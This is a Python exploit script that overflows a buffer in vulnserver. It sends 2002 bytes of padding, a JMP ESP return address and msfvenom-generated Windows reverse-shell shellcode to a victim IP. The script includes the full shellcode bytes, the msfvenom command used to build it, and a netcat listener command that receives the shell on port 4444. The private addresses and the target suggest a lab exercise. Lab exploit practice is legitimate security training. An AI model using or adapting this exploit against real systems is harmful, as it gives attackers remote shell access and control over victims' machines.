# To receive the reverse shell, run the following command at another terminal
#   nc -l -v -p 4444
# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.7'   # vitcim IP
PORT = 9999         # victim port

# Shellcode created by msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8
#   LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a'
SHELL =  b""
SHELL += b"\xdb\xc6\xd9\x74\x24\xf4\x5e\xbd\x31\xd1\x86\x9d"
SHELL += b"\x29\xc9\xb1\x52\x31\x6e\x17\x03\x6e\x17\x83\xdf"
SHELL += b"\x2d\x64\x68\xe3\x26\xeb\x93\x1b\xb7\x8c\x1a\xfe"
SHELL += b"\x86\x8c\x79\x8b\xb9\x3c\x09\xd9\x35\xb6\x5f\xc9"
SHELL += b"\xce\xba\x77\xfe\x67\x70\xae\x31\x77\x29\x92\x50"
SHELL += b"\xfb\x30\xc7\xb2\xc2\xfa\x1a\xb3\x03\xe6\xd7\xe1"
SHELL += b"\xdc\x6c\x45\x15\x68\x38\x56\x9e\x22\xac\xde\x43"
SHELL += b"\xf2\xcf\xcf\xd2\x88\x89\xcf\xd5\x5d\xa2\x59\xcd"
SHELL += b"\x82\x8f\x10\x66\x70\x7b\xa3\xae\x48\x84\x08\x8f"
SHELL += b"\x64\x77\x50\xc8\x43\x68\x27\x20\xb0\x15\x30\xf7"
SHELL += b"\xca\xc1\xb5\xe3\x6d\x81\x6e\xcf\x8c\x46\xe8\x84"
SHELL += b"\x83\x23\x7e\xc2\x87\xb2\x53\x79\xb3\x3f\x52\xad"
SHELL += b"\x35\x7b\x71\x69\x1d\xdf\x18\x28\xfb\x8e\x25\x2a"
SHELL += b"\xa4\x6f\x80\x21\x49\x7b\xb9\x68\x06\x48\xf0\x92"
SHELL += b"\xd6\xc6\x83\xe1\xe4\x49\x38\x6d\x45\x01\xe6\x6a"
SHELL += b"\xaa\x38\x5e\xe4\x55\xc3\x9f\x2d\x92\x97\xcf\x45"
SHELL += b"\x33\x98\x9b\x95\xbc\x4d\x0b\xc5\x12\x3e\xec\xb5"
SHELL += b"\xd2\xee\x84\xdf\xdc\xd1\xb5\xe0\x36\x7a\x5f\x1b"
SHELL += b"\xd1\x8f\xa0\x21\x29\xf8\xa2\x25\x38\xa4\x2b\xc3"
SHELL += b"\x50\x44\x7a\x5c\xcd\xfd\x27\x16\x6c\x01\xf2\x53"
SHELL += b"\xae\x89\xf1\xa4\x61\x7a\x7f\xb6\x16\x8a\xca\xe4"
SHELL += b"\xb1\x95\xe0\x80\x5e\x07\x6f\x50\x28\x34\x38\x07"
SHELL += b"\x7d\x8a\x31\xcd\x93\xb5\xeb\xf3\x69\x23\xd3\xb7"
SHELL += b"\xb5\x90\xda\x36\x3b\xac\xf8\x28\x85\x2d\x45\x1c"
SHELL += b"\x59\x78\x13\xca\x1f\xd2\xd5\xa4\xc9\x89\xbf\x20"
SHELL += b"\x8f\xe1\x7f\x36\x90\x2f\xf6\xd6\x21\x86\x4f\xe9"
SHELL += b"\x8e\x4e\x58\x92\xf2\xee\xa7\x49\xb7\x0f\x4a\x5b"
SHELL += b"\xc2\xa7\xd3\x0e\x6f\xaa\xe3\xe5\xac\xd3\x67\x0f"
SHELL += b"\x4d\x20\x77\x7a\x48\x6c\x3f\x97\x20\xfd\xaa\x97"
SHELL += b"\x97\xfe\xfe"

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 2002 +   # padding 
    # 62501205   FFE4             JMP ESP
    # Return a bytes object.
    # Format string '<L': < means little-endian;
    # L means unsigned long
    struct.pack('<L', 0x6250151C) + 
    b'C' * 32 +
    SHELL
    # b'C' * (5000 - 2003 - 4 - 32 - len(SHELL)) # no need really
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
